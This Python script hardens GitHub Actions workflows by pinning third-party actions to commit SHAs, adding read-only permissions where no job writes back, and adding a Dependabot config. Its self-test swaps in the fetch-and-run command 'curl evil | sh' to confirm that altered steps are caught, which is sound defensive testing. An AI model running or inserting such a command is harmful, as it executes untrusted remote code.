#!/usr/bin/env python3
"""Mechanical, low-risk fixes for what secure.py reports on GitHub Actions workflows.

    python harden.py --dir <clone>            show what would change
    python harden.py --dir <clone> --apply    change the files (commit and push them yourself)
    python harden.py --selftest

What it does, and nothing else:
  W5  pins every third-party action to the commit its tag points at, keeping the tag as a comment
  W3  adds `permissions: {contents: read}` to a workflow that has none, but ONLY when nothing in the
      workflow writes back (push, release, pages, comments, packages). A workflow that writes is listed
      as `manual` and left alone: its scopes are a decision, not a text edit.
  H2  adds .github/dependabot.yml (GitHub Actions, monthly, one grouped PR) when the repo pins actions
      and has no Dependabot config, so the pins do not go stale.

Every edit is checked: the file must still be valid YAML and the same workflow apart from the two keys.
"""
from __future__ import annotations

import argparse
import json
import re
import subprocess
import sys
from pathlib import Path

HERE = Path(__file__).resolve().parent
PIN_CACHE = HERE / "pins.json"
NO_WINDOW = 0x08000000 if sys.platform == "win32" else 0
TRUSTED_ACTION_OWNERS = {"actions", "github"}
USES = re.compile(r"^(?P<head>\s*-?\s*uses:\s*)(?P<quote>['\"]?)(?P<target>[^'\"\s#]+)(?P=quote)(?P<tail>.*)$")
SHA = re.compile(r"^[0-9a-f]{40}$")
WRITES_BACK = re.compile(
    r"git\s+push|git\s+commit|gh\s+(release|pr|issue|api|workflow|repo|run|variable|secret|label)\b"
    r"|GITHUB_TOKEN|GH_TOKEN|github\.token|deploy-pages|upload-pages-artifact|configure-pages"
    r"|action-gh-release|create-release|upload-release|github-script|peter-evans/|stefanzweifel/"
    r"|docker/login-action|attest|id-token|packages:|cosign|gh-pages|wrangler|pages deploy",
    re.IGNORECASE,
)
DEPENDABOT = """# Keeps the commit-pinned actions in .github/workflows current: one grouped pull request a month.
version: 2
updates:
  - package-ecosystem: github-actions
    directory: /
    schedule:
      interval: monthly
    groups:
      actions:
        patterns: ["*"]
"""


def run(*args: str, timeout: int = 60) -> tuple[int, str]:
    result = subprocess.run(args, capture_output=True, timeout=timeout, creationflags=NO_WINDOW)
    return result.returncode, result.stdout.decode("utf-8", errors="replace")


def load_pins() -> dict:
    if PIN_CACHE.exists():
        return json.loads(PIN_CACHE.read_text(encoding="utf-8"))
    return {}


def resolve_pin(owner_repo: str, ref: str, pins: dict) -> tuple[str, str] | None:
    """(commit, label) for owner/repo@ref. The label is the most exact version tag on that commit."""
    key = f"{owner_repo}@{ref}"
    if key in pins:
        return pins[key]["sha"], pins[key]["label"]
    code, out = run("git", "ls-remote", f"https://github.com/{owner_repo}")
    if code != 0:
        return None
    by_ref: dict[str, str] = {}
    for line in out.splitlines():
        commit, _, name = line.partition("\t")
        by_ref[name] = commit
    commit = (by_ref.get(f"refs/tags/{ref}^{{}}") or by_ref.get(f"refs/tags/{ref}")
              or by_ref.get(f"refs/heads/{ref}"))
    if not commit:
        return None
    same = {name.removeprefix("refs/tags/").removesuffix("^{}")
            for name, value in by_ref.items() if value == commit and name.startswith("refs/tags/")}
    label = max(same, key=lambda name: (name.count("."), name)) if same else ref
    pins[key] = {"sha": commit, "label": label}
    return commit, label


def pin_actions(text: str, pins: dict) -> tuple[str, list[str]]:
    notes, out = [], []
    for line in text.split("\n"):
        match = USES.match(line.rstrip("\r"))
        ending = "\r" if line.endswith("\r") else ""
        if not match or "@" not in match["target"] or match["target"].startswith(("./", "docker://")):
            out.append(line)
            continue
        action, ref = match["target"].rsplit("@", 1)
        owner = action.split("/")[0].lower()
        if owner in TRUSTED_ACTION_OWNERS or SHA.match(ref):
            out.append(line)
            continue
        owner_repo = "/".join(action.split("/")[:2])
        resolved = resolve_pin(owner_repo, ref, pins)
        if not resolved:
            notes.append(f"manual: could not resolve {match['target']}")
            out.append(line)
            continue
        commit, label = resolved
        out.append(f"{match['head']}{match['quote']}{action}@{commit}{match['quote']} # {label}{ending}")
        notes.append(f"pinned {match['target']} -> {commit[:12]} ({label})")
    return "\n".join(out), notes


def add_read_permissions(text: str) -> tuple[str, list[str]]:
    import yaml
    document = yaml.safe_load(text) or {}
    if not isinstance(document, dict) or "permissions" in document:
        return text, []
    jobs = document.get("jobs") if isinstance(document.get("jobs"), dict) else {}
    uncovered = {name: job for name, job in jobs.items() if isinstance(job, dict) and "permissions" not in job}
    if not uncovered:
        return text, []
    # A job with its own permissions: block keeps them; only jobs without one fall back to the new default.
    for name, job in uncovered.items():
        reason = WRITES_BACK.search(json.dumps(job, default=str))
        if reason:
            return text, [f"manual: permissions left alone, job {name!r} writes back ({reason.group(0)!r})"]
    lines = text.split("\n")
    for index, line in enumerate(lines):
        if re.match(r"jobs:\s*(#.*)?\r?$", line):
            ending = "\r" if line.endswith("\r") else ""
            block = [f"permissions:{ending}", f"  contents: read{ending}", ending]
            return "\n".join(lines[:index] + block + lines[index:]), ["added permissions: contents: read"]
    return text, ["manual: no top-level jobs: line found"]


def same_workflow(before: str, after: str) -> bool:
    """True when the edit changed only `uses:` refs and the top-level permissions key."""
    import yaml

    def strip(node):
        if isinstance(node, dict):
            return {key: ("<uses>" if key == "uses" else strip(value)) for key, value in node.items()}
        if isinstance(node, list):
            return [strip(item) for item in node]
        return node

    old, new = yaml.safe_load(before) or {}, yaml.safe_load(after) or {}
    if not isinstance(old, dict) or not isinstance(new, dict):
        return False
    new = dict(new)
    if "permissions" not in old:
        new.pop("permissions", None)
    return strip(old) == strip(new)


def harden(directory: Path, apply: bool) -> list[str]:
    pins = load_pins()
    report: list[str] = []
    workflows = sorted((directory / ".github" / "workflows").glob("*.y*ml")) if (directory / ".github" / "workflows").is_dir() else []
    pinned_any = False
    for path in workflows:
        raw = path.read_bytes().decode("utf-8")
        text, pin_notes = pin_actions(raw, pins)
        text, permission_notes = add_read_permissions(text)
        notes = pin_notes + permission_notes
        if text != raw:
            if not same_workflow(raw, text):
                report.append(f"{path.name}: manual: the edit would change more than uses/permissions, skipped")
                continue
            if apply:
                path.write_bytes(text.encode("utf-8"))
        pinned_any = pinned_any or bool(re.search(r"uses:\s*['\"]?[^\s'\"]+@[0-9a-f]{40}", text))
        report += [f"{path.name}: {note}" for note in notes]
    has_dependabot = any((directory / ".github" / name).exists() for name in ("dependabot.yml", "dependabot.yaml"))
    if pinned_any and not has_dependabot:
        if apply:
            (directory / ".github" / "dependabot.yml").write_bytes(DEPENDABOT.encode("utf-8"))
        report.append("dependabot.yml: added (github-actions, monthly, grouped)")
    if apply:
        PIN_CACHE.write_text(json.dumps(pins, indent=2, sort_keys=True) + "\n", encoding="utf-8", newline="\n")
    return report


def selftest() -> int:
    pins = {
        "acme/tool@v2": {"sha": "a" * 40, "label": "v2.1.0"},
    }
    workflow = (
        "name: ci\non: [push]\njobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n"
        "      - uses: actions/checkout@v4\n      - uses: acme/tool@v2\n      - run: pytest\n"
    )
    pinned, notes = pin_actions(workflow, pins)
    with_permissions, permission_notes = add_read_permissions(pinned)
    writer = workflow + "      - run: git push origin main\n"
    covered_writer = workflow + (
        "  publish:\n    runs-on: ubuntu-latest\n    permissions:\n      contents: write\n"
        "    steps:\n      - run: git push origin main\n"
    )
    crlf = workflow.replace("\n", "\r\n")
    crlf_out, _ = pin_actions(crlf, pins)
    crlf_out, _ = add_read_permissions(crlf_out)
    checks = {
        "third-party action pinned with label": f"uses: acme/tool@{'a' * 40} # v2.1.0" in pinned,
        "first-party action untouched": "uses: actions/checkout@v4\n" in pinned,
        "already pinned stays": pin_actions(pinned, pins)[0] == pinned,
        "read permissions added": "permissions:\n  contents: read\n\njobs:" in with_permissions and bool(permission_notes),
        "existing permissions kept": add_read_permissions(with_permissions)[0] == with_permissions,
        "writer left for a person": add_read_permissions(writer)[0] == writer and "manual" in add_read_permissions(writer)[1][0],
        "writer with its own permissions is fine": "permissions:\n  contents: read\n\njobs:" in add_read_permissions(covered_writer)[0],
        "edit is the same workflow": same_workflow(workflow, with_permissions),
        "a changed step is caught": not same_workflow(workflow, with_permissions.replace("pytest", "curl evil | sh")),
        "CRLF kept": "\r\n" in crlf_out and "\n" not in crlf_out.replace("\r\n", ""),
    }
    for name, passed in checks.items():
        print(("ok   " if passed else "FAIL ") + name)
    print(f"{sum(checks.values())}/{len(checks)} checks passed")
    return 0 if all(checks.values()) else 1


def main() -> int:
    parser = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    parser.add_argument("--dir", default=".")
    parser.add_argument("--apply", action="store_true")
    parser.add_argument("--selftest", action="store_true")
    arguments = parser.parse_args()
    if arguments.selftest:
        return selftest()
    report = harden(Path(arguments.dir).resolve(), arguments.apply)
    for line in report:
        print(line)
    print(("changed" if arguments.apply else "would change") + f": {sum(1 for line in report if 'manual' not in line)}"
          f", manual: {sum(1 for line in report if 'manual' in line)}")
    return 0


if __name__ == "__main__":
    sys.exit(main())
